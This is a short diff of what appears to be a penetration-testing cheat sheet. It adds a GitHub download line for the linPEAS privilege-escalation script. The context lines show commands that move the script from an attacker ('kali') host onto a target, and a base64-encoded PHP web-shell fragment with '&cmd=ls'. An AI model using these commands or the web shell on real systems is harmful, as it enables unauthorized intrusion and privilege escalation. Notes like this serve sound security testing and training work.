@@ -968,6 +968,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     #kali
     scp linpeas.sh user@target
     wget http://<kali>/linpeas.sh -O linpeas.sh
+    wget https://github.com/peass-ng/PEASS-ng/releases/download/20250801-03e73bf3/linpeas.sh
 
     #target
     chmod +x linpeas.sh
